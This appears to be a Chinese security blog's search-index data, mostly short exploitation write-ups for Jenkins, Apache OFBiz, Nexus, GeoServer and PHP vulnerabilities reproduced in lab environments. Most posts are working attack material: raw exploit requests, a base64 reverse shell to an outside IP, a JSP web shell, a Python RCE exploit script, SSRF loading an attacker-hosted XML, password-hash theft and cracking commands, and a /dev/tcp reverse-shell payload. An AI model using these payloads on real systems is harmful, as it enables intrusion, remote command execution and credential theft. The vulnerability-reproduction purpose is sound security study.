1.0\n\n预测正确855瓶，53%概率可以预测一瓶酒是好酒，识别出了所有的好酒，这个模型确实是高质量的，得到我们所预期的了，但是这跟随机说实话差不了多少，实际情况葡萄酒的质量不只是有这些因素决定的\n在后面的简单的神经网络就可以客服这些限制，就像许多其他的基本的机器学习的方法一样，后面也会之间构建自己的第一个神经网络\n","categories":["深度学习"],"tags":["深度学习"]},{"url":"/2025/07/18/jenkins%E6%BC%8F%E6%B4%9E/cve-2024-23897/jetkins%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96/","content":"jetkins任意文件读取CVE-2024-23897CVE - 2024 - 23897是Jenkins存在的一个任意文件读取漏洞。Jenkins为用户提供了命令行接口，用户能够借助jenkins - cli.jar调用该接口，进而执行Jenkins的部分功能。然而，当使用jenkins - cli.jar执行命令行操作时，服务端会利用第三方库args4j对命令行进行解析。在解析过程中，若参数以@开头，系统就会把它认定为一个文件名，随后读取该文件的内容并将其作为参数。这一机制存在风险，一旦参数设置不当，就可能引发报错，且报错信息会将文件内容显示出来，从而导致任意文件读取的情况发生。目前我的能力只能把漏洞打一遍，原理分析请看P神的原理分析文章受影响版本：Jenkins 版本&lt;= 2.441Jenkins 版本&lt;= LTS 2.426.2\n漏洞复现借用春秋云境的靶场环境\n\n先访问访问http://靶场IP:ports/jnlpJars/jenkins-cli.jar下载到相关的jar文件，然后直接运行下面的命令\njava -jar .\\jenkins-cli.jar -s http://8.147.132.32:44175/ -http help 1 \"@etc/passwd\"\n\n\n成功读取出了第一行内容，这个命令缺点在于只能读取文件部分内容\n\n直接读取到flag\n一些命令输出较多，看下面这个\njava -jar .\\jenkins-cli.jar -s http://8.147.132.32:44175/  connect-node \"@etc/passwd\"\n\n[Jenkins 安装](https://so.csdn.net/so/search?q=Jenkins 安装&amp;spm=1001.2101.3001.7020)将有一个文件/var/jenkins_home/users/users.xml，其中列出了此处的所有有效用户\njava -jar jenkins-cli.jar -s http://localhost:8080/ connect-node \"/var/jenkins_home/users/users.xml\"\n\n\n这里读出来adminusers.xml显示系统上的单个用户，admin，其信息文件夹为/var/jenkins_home/users/admin_5965741382068509608在 Jenkins 上的每个用户文件夹中，始终有一个包含用户密码哈希的config.xml文件。所以现在读取/var/jenkins_home/users/admin_5965741382068509608/config.xml\njava -jar jenkins-cli.jar -s http://localhost:8080/ connect-node \"/var/jenkins_home/users/admin_5965741382068509608/config.xml\"\n\n如果顺利就能读到hash值，直接使用kali进行爆破\nhashcat -m 3200 info.txt rockyou.txt\n\n总结Jenkins提供了一个命令行的接口，jenkins-clijar是它的命令行客户端，通过jenkins-clijar可以去执行一些Jenkins中的功能。利用条件：Jenkins 版本&lt;= 2.441 和Jenkins 版本&lt;= LTS 2.426.2+开启了Allow anonymous read access（读取完整文件）\n"},{"url":"/2025/07/18/Apache%20ofiz%E6%BC%8F%E6%B4%9E/cve-2024-38856/CVE-2024-38856/","content":"CVE-2024-38856没错，还是apache OFBiz系统的，并且依旧是开发人员未彻底修复\n影响版本\nApache OFBiz &lt;= 18.12.14\n直接构造发送数据包\nPOST /webtools/control/main/ProgramExport HTTP/1.1Host: 127.0.0.1:8443Connection: closeUpgrade-Insecure-Requests: 1User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.83 Safari/537.36Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9Sec-Fetch-Site: noneSec-Fetch-Mode: navigateSec-Fetch-User: ?1Sec-Fetch-Dest: documentAccept-Encoding: gzip, deflateAccept-Language: zh-CN,zh;q=0.9Content-Type: application/x-www-form-urlencodedContent-Length: 272​groovyProgram=\\u0074\\u0068\\u0072\\u006f\\u0077\\u0020\\u006e\\u0065\\u0077\\u0020\\u0045\\u0078\\u0063\\u0065\\u0070\\u0074\\u0069\\u006f\\u006e\\u0028\\u0027\\u0063\\u0061\\u006c\\u0063\\u0027\\u002e\\u0065\\u0078\\u0065\\u0063\\u0075\\u0074\\u0065\\u0028\\u0029\\u002e\\u0074\\u0065\\u0078\\u0074\\u0029\\u003b\n\n这个是执行打开计算机的命令，可以根据自己的需求更换命令\n`\\u0074\\u0068\\u0072\\u006f\\u0077\\u0020\\u006e\\u0065\\u0077\\u0020\\u0045\\u0078\\u0063\\u0065\\u0070\\u0074\\u0069\\u006f\\u006e\\u0028\\u0027\\u0063\\u0061\\u006c\\u0063\\u0027\\u002e\\u0065\\u0078\\u0065\\u0063\\u0075\\u0074\\u0065\\u0028\\u0029\\u002e\\u0074\\u0065\\u0078\\u0074\\u0029\\u003b` 是 `throw new Exception('calc'.execute().text);` 进行编码后的数据\n\n"},{"url":"/2025/07/18/Apache%20ofiz%E6%BC%8F%E6%B4%9E/cve-2024-32113/CVE-2024-32113/","content":"CVE-2024-32113打法和cve-2024-36104一样的，就不过多的赘述\n"},{"url":"/2025/07/18/nexus3%E6%BC%8F%E6%B4%9E/cve-2024-4956/nexus3%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96/","content":"nexus3任意文件读取漏洞简介：Nexus Repository Manager 是一个存储库管理器，用于组织、存储和分发开发所需的工件。在 Nexus Repository 3.68.1 之前的版本中发现了一个路径遍历漏洞。此漏洞允许攻击者构造一个 URL 来下载 Nexus Repository 应用程序范围之外的系统文件，而无需任何身份验证。这会带来重大风险，因为它可能会暴露敏感的系统文件，并可能危及安装 Nexus Repository 的环境的安全。建议尽快将 Nexus Repository 更新至 3.68.1 或更高版本，以减轻此漏洞的影响。\n漏洞原理：攻击者可以制作一个 URL 来返回任何文件作为下载，包括 Sonatype Nexus Repository 3 应用程序范围之外的系统文件。\n漏洞利用前提：攻击者必须具有 Sonatype Nexus Repository 3 实例的网络访问权限。\n漏洞利用版本该漏洞影响 Sonatype Nexus Repository Manager 3.0 至 3.68.0 版本。\n防御措施升级 Nexus Repository 是消除此漏洞的推荐方法。但是，对于无法立即升级的部署，可以使用即时缓解选项：参考：● https://support.sonatype.com/hc/en-us/articles/29412417068819\n修复建议：l 定期更新系统补丁，减少系统漏洞，提升服务器的安全性。l 加强系统和网络的访问控制，修改防火墙策略，关闭非必要的应用端口或服务，减少将危险服务（如SSH、RDP等）暴露到公网，减少攻击面。l 使用企业级安全产品，提升企业的网络安全性能。l 加强系统用户和权限管理，启用多因素认证机制和最小权限原则，用户和软件权限应保持在最低限度。l 启用强密码策略并设置为定期修改。漏洞复现\nGET /%2f%2f%2f%2f%2f%2f%2f%2f%2f%2f%2f%2f%2f%2f%2f%2f%2f%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f../flag HTTP/1.1Host: 8.147.132.32:25912Cookie: NX-ANTI-CSRF-TOKEN=0.06856643752905667; apt.uid=AP-YFGMCGUNNIFB-2-1752740457278-79341969.0.2.6b933aba-006b-4c12-b4b5-a0ddc2adfcf4; apt.sid=AP-YFGMCGUNNIFB-2-1752740457277-69755973User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36 Edg/138.0.0.0Accept: */*Referer: http://8.147.132.32:25912/Accept-Encoding: gzip, deflateAccept-Language: zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6\n\n\n"},{"url":"/2025/07/18/GeoServer%E6%BC%8F%E6%B4%9E/cve-2024-36401/CVE-2024-36401/","content":"CVE-2024-36401一、概述CVE-2024-36401 是 GeoServer 中存在的高危远程代码执行（RCE）漏洞，由 GeoTools 库 在处理 WFS（Web Feature Service）请求时对 valueReference 参数未正确过滤引发。攻击者可通过构造恶意 XPath 表达式，利用 java.lang.Runtime.getRuntime() 执行任意系统命令，进而完全控制目标服务器\n- \n  影响版本\n  ：\n\nGeoServer &lt; 2.23.6\n\n2.24.0 ≤ GeoServer &lt; 2.24.4\n\n2.25.0 ≤ GeoServer &lt; 2.25.2\n\n漏洞根源：GeoTools 库将属性名称传递给 Apache Commons JXPath 库时未安全处理，导致 XPath 表达式注入\n\n\n二、分析（1）技术原理\n\n触发路径：通过 WFS 请求的 valueReference 参数注入恶意代码。\n依赖组件：commons-jxpath 库（存在 CVE-2022-41852 漏洞）的不安全解析​​（2）攻击特征​​\n请求方式：支持 GET 和 POST 请求，常见于 /geoserver/wfs 接口\n利用条件：typeNames 必须为有效图层名称（如 sf:archsites），可从 GeoServer 管理界面获取\n\n三、复现这个漏洞复现需要一台具有公网ip的服务器，执行命令是没有回显的，也可以尝试别的方法，但是我尝试dnslog数据外带没有用处，构造数据包\nPOST /geoserver/wfs HTTP/1.1Host: &lt;target&gt;:8080Content-Type: application/xmlContent-Length: 342&lt;wfs:GetPropertyValue service=\"WFS\" version=\"2.0.0\" xmlns:wfs=\"http://www.opengis.net/wfs/2.0\"&gt;  &lt;wfs:Query typeNames=\"sf:archsites\"/&gt;  &lt;wfs:valueReference&gt;exec(java.lang.Runtime.getRuntime(),\"bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC80Ny4xMy44MC4xNS84ODg5IDA+JjE=}|{base64,-d}|{bash,-i}\")&lt;/wfs:valueReference&gt;&lt;/wfs:GetPropertyValue&gt;bash -i &gt;&amp; /dev/tcp/47.122.156.204/8889 0&gt;&amp;1\n\n\n看到这个报错就意味着命令已经成功执行\n\n各种poc如下GET请求GET /geoserver/wfs?service=WFS&amp;version=2.0.0&amp;request=GetPropertyValue&amp;typeNames=sf:archsites&amp;valueReference=exec(java.lang.Runtime.getRuntime(),'touch%20/tmp/success1') HTTP/1.1Host: your-ip:8080Accept-Encoding: gzip, deflate, brAccept: */*Accept-Language: en-US;q=0.9,en;q=0.8User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.6367.118 Safari/537.36Connection: closeCache-Control: max-age=0其中get版本的typename必须是存在的，我们可以在Web页面中找到当前服务器中的所有Types：/geoserver/web/wicket/bookmarkable/org.geoserver.web.demo.MapPreviewPage?1&amp;filter=falsePOST请求POST /geoserver/wfs HTTP/1.1Host: 192.168.67.158:8080Accept-Encoding: gzip, deflate, brAccept: */*Accept-Language: en-US;q=0.9,en;q=0.8User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.6367.118 Safari/537.36Connection: closeCache-Control: max-age=0Content-Type: application/xmlContent-Length: 341 &lt;wfs:GetPropertyValue service='WFS' version='2.0.0' xmlns:topp='http://www.openplans.org/topp' xmlns:fes='http://www.opengis.net/fes/2.0' xmlns:wfs='http://www.opengis.net/wfs/2.0'&gt;  &lt;wfs:Query typeNames='sf:archsites'/&gt;  &lt;wfs:valueReference&gt;exec(java.lang.Runtime.getRuntime(),\"calc\")&lt;/wfs:valueReference&gt;&lt;/wfs:GetPropertyValue&gt;\n\npython版本的\nimport sysimport requests #proxy={'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}proxy = None def send_post_request(url, command):    data = \"\"\"&lt;wfs:GetPropertyValue service='WFS' version='2.0.0' xmlns:topp='http://www.openplans.org/topp' xmlns:fes='http://www.opengis.net/fes/2.0' xmlns:wfs='http://www.opengis.net/wfs/2.0'&gt;  &lt;wfs:Query typeNames='sf:archsites'/&gt;  &lt;wfs:valueReference&gt;exec(java.lang.Runtime.getRuntime(),\"%s\")&lt;/wfs:valueReference&gt;&lt;/wfs:GetPropertyValue&gt;\"\"\" % command        host = url.replace('http://', '').replace('https://', '').rstrip('/')    headers = {        'Host': '%s' % host,        'Accept-Encoding': 'gzip, deflate, br',        'Accept': '*/*',        'Accept-Language': 'en-US;q=0.9,en;q=0.8',        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.6367.118 Safari/537.36',        'Connection': 'close',        'Cache-Control': 'max-age=0',        'Content-Type': 'application/xml',        'Content-Length': str(len(data))  # 数据长度    }    try:        response = requests.post(url+'/geoserver/wfs', data=data, headers=headers, proxies=proxy, timeout=15)        if response.status_code == 400 and 'java.lang.ClassCastException' in response.text:            print('[*]漏洞利用成功')            print('响应码：%s' % response.status_code)            print('响应体：\\n%s' % response.text)     except requests.exceptions.RequestException as e:        print(f\"An error occurred: {e}\") if __name__ == \"__main__\":    if len(sys.argv) != 3:        print(\"Usage: python3 poc.py &lt;url&gt; &lt;command&gt;\")        sys.exit(1)     url = sys.argv[1]    command = sys.argv[2]     print('CVE-2024-36401 Geoserver远程代码执行漏洞EXP')    send_post_request(url.rstrip('/'), command)\n\n"},{"url":"/2025/07/18/Apache%20ofiz%E6%BC%8F%E6%B4%9E/cve-2024-45195/CVE-2024-45195/","content":"CVE-2024-45195这个漏洞是一个影响Apache OFBiz的未授权远程代码执行漏洞，成因还是和其他几个rce一样，根本原因在于web应用程序中缺少视图授权检查，通过特定的接口将恶意文件写入服务器，从而执行任意的代码，例如攻击者可以使用viewdatafile接口将恶意 的csv文件内容写入任意文件，实现写入shell\n漏洞复现\n首先先准备两个恶意文件，先创建一个rceschema.xml文件：\n&lt;data-files xsi:noNamespaceSchemaLocation=\"http://ofbiz.apache.org/dtds/datafiles.xsd\"    xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\"&gt;    &lt;data-file name=\"rce\" separator-style=\"fixed-length\" type-code=\"text\" start-line=\"0\"        encoding-type=\"UTF-8\"&gt;        &lt;record name=\"rceentry\" limit=\"many\"&gt;            &lt;field name=\"jsp\" type=\"String\" length=\"605\" position=\"0\"&gt;&lt;/field&gt;        &lt;/record&gt;    &lt;/data-file&gt;&lt;/data-files&gt;\n\n再创建一个csv文件：\n&lt;%@ page import='java.io.*' %&gt; &lt;%@ page import='java.util.*' %&gt; &lt;h1&gt;Ahoy!&lt;/h1&gt;&lt;br&gt; &lt;% String getcmd = request.getParameter(\"cmd\"); if (getcmd != null) { \tout.println(\"Command: \" + getcmd + \"&lt;br&gt;\"); \tString cmd1 = \"/bin/sh\"; \tString cmd2 = \"-c\"; \tString cmd3 = getcmd; \tString[] cmd = new String[3]; \tcmd[0] = cmd1; \tcmd[1] = cmd2; \tcmd[2] = cmd3; \tProcess p = Runtime.getRuntime().exec(cmd); \tOutputStream os = p.getOutputStream(); \tInputStream in = p.getInputStream(); \tDataInputStream dis = new DataInputStream(in); \tString disr = dis.readLine(); \twhile (disr != null) \t{ \t\tout.println(disr); \t\tdisr = dis.readLine(); \t} } %&gt;\n\n随后利用\npython3 -m http.server\n\n运行一个静态服务器，放上这两个文件\n随后是利用的poc\nPOST /webtools/control/main/viewdatafile HTTP/1.1Host: 127.0.0.1:8443User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7Content-Type: application/x-www-form-urlencodedContent-Length: 241DATAFILE_LOCATION=http://127.0.0.1:8000/pwn.csv&amp;DATAFILE_SAVE=./applications/accounting/webapp/accounting/shell.jsp&amp;DATAFILE_IS_URL=true&amp;DEFINITION_LOCATION=http://127.0.0.1:8000/rce.xml&amp;DEFINITION_IS_URL=true&amp;DEFINITION_NAME=rce\n\n以春秋云境的靶场为例，稍微改改poc就可以直接使用了\nGET /accounting/shell.jsp?cmd=id HTTP/1.1 Host: 目标网址\n\n春秋云境的靶场貌似有点问题\n\n官方在修复该漏洞时，除了在各种配置文件中加入了 auth 配置，更重要的是在 RequestHandler 的 renderView 方法中也加入了鉴权逻辑，确保后续无论渲染哪个路径都会进行鉴权1。\n通过这些措施，Apache OFBiz 的安全性得到了显著提升，防止了未经授权的访问和远程代码执行。\n"},{"url":"/2025/07/18/Apache%20ofiz%E6%BC%8F%E6%B4%9E/cve-2024-45507/CVE-2024-45507/","content":"CVE-2024-45507前言漏洞名称：Apache OFBiz SSRF to RCE\n漏洞影响：version &lt; 18.12.16\nCVE：CVE-2024-45507\n漏洞描述该漏洞利用了 Apache OFBiz 中的 SSRF 漏洞，攻击者可以通过特定的 URL 请求，诱使服务器加载并执行恶意的 XML 文件，从而实现远程代码执行。漏洞的触发路径包括/webtools/control/main/findTemporalExpression和webtools/control/forgotPassword/findTemporalExpression 等\n漏洞利用\n攻击者可以构造如下请求来利用该漏洞：\nPOST /webtools/control/main/findTemporalExpression HTTP/1.1Host: 目标IP:8443Content-Type: application/x-www-form-urlencodedtempExprDecoratorLocation=http://攻击者IP/恶意文件.xml\n\n恶意 XML 文件内容示例：\n&lt;?xml version=\"1.0\" encoding=\"UTF-8\"?&gt;&lt;screens xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\"xmlns=\"http://ofbiz.apache.org/Widget-Screen\"xsi:schemaLocation=\"http://ofbiz.apache.org/Widget-Screen http://ofbiz.apache.org/dtds/widget-screen.xsd\"&gt;&lt;screen name=\"StatsDecorator\"&gt;&lt;section&gt;&lt;actions&gt;&lt;set field=\"headerItem\" value=\"${groovy:throw new Exception('ls'.execute().text);}\" /&gt;&lt;/actions&gt;&lt;/section&gt;&lt;/screen&gt;&lt;/screens&gt;\n\n通过上述请求，服务器会加载并执行恶意 XML 文件中的代码，从而实现远程代码执行23。\n"},{"url":"/2025/07/18/php%E6%BC%8F%E6%B4%9E/cve-2018-19518/php%20imap%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/","content":"php imap远程命令执行漏洞前言php imap扩展用于在PHP中执行邮件收发操作。其imap_open函数会调用rsh来连接远程shell，而debian/ubuntu中默认使用ssh来代替rsh的功能（也就是说，在debian系列系统中，执行rsh命令实际执行的是ssh命令）。\n因为ssh命令中可以通过设置-oProxyCommand=来调用第三方命令，攻击者通过注入注入这个参数，最终将导致命令执行漏洞。\n漏洞复现输入数据，抓包\n\n上述中x+-oProxyCommand%3decho%09ZWNobyAnMTIzNDU2Nzg5MCc%2bL3RtcC90ZXN0MDAwMQo%3d|base64%09-d|sh}的意思如下使用url编码解码后x -oProxyCommand=echo ZWNobyAnMTIzNDU2Nzg5MCc+L3RtcC90ZXN0MDAwMQo=|base64 -d|sh}ZWNobyAnMTIzNDU2Nzg5MCc+L3RtcC90ZXN0MDAwMQo=的意思是echo '1234567890'&gt;/tmp/test0001通过-oProxyCommand参数执行命令，x可以是任意值\n\n反弹shell这里有很多反弹shell的思路，可以直接传入命令执行反弹shell,但是更稳定的方法是写入反弹shell文件，然后执行反弹shell文件获得稳定控制权限，两种方法都行，看个人的喜好\n直接构造payload\necho \"/bin/bash -i &gt;&amp; /dev/tcp/ip/4444 0&gt;&amp;1\" &gt; /tmp/123# base64encodeZWNobyAiL2Jpbi9iYXNoIC1pID4mIC9kZXYvdGNwLzE3Mi4yMi4wLjEvNDQ0NCAwPiYxIiA+IC90bXAvMTIz# 将base64编码内容替换x+-oProxyCommand%3decho%09[base64编码内容]|base64%09-d|sh}&amp;username=111&amp;password=222x+-oProxyCommand%3decho%09ZWNobyAiL2Jpbi9iYXNoIC1pID4mIC9kZXYvdGNwLzE3Mi4yMi4wLjEvNDQ0NCAwPiYxIiA+IC90bXAvMTIz|base64%09-d|sh}# 将base64编码内容再次进行url编码x+-oProxyCommand%3decho%09ZWNobyAiL2Jpbi9iYXNoIC1pID4mIC9kZXYvdGNwLzE3Mi4yMi4wLjEvNDQ0NCAwPiYxIiA%2bIC90bXAvMTIz|base64%09-d|sh}\n\n直接提交\n使用/bin/bash触发/tmp/123反弹shell脚本\n/bin/bash /tmp/123# base64encodeL2Jpbi9iYXNoIC90bXAvMTIz# 替换base64内容后进行url编码x+-oProxyCommand%3decho%09L2Jpbi9iYXNoIC90bXAvMTIz|base64%09-d|sh}\n\n\n拿到shell\n\n"},{"url":"/2025/07/18/php%E6%BC%8F%E6%B4%9E/cve-2024-2961/php-filter-iconv-main/README/","content":"php-filter-iconv修改自https://github.com/ambionics/cnext-exploits\nphp-filter-iconv.py用法通过任意文件下载获取目标的/proc/self/maps和libc-2.x.so，在本机和php-filter-iconv.py放在同目录，然后运行脚本即可生成php://filter/的RCE payload，详细参数调整如下代码即可。\n.......maps_path = './maps'cmd = 'echo 123 &gt; 1.txt'sleep_time = 1padding = 20if not os.path.exists(maps_path):    exit(\"[-]no maps file\")regions = get_regions(maps_path)heap, libc_info = get_symbols_and_addresses(regions)libc_path = libc_info.pathprint(\"[*]download: \"+libc_path)libc_path = './libc-2.23.so'.......\n\nphp-filter-iconv.php用法直接上传到已经获得webshell的服务器进行bypass disable_functions，然后访问如下链接检测环境\n/php-filter-iconv.php?cmd=curl 127.0.0.1:8888&amp;run=0\n然后访问如下链接进行命令执行，一切顺利命令会执行成功，服务器会延时几分钟报503\n/php-filter-iconv.php?cmd=curl 127.0.0.1:8888&amp;run=1\n"}]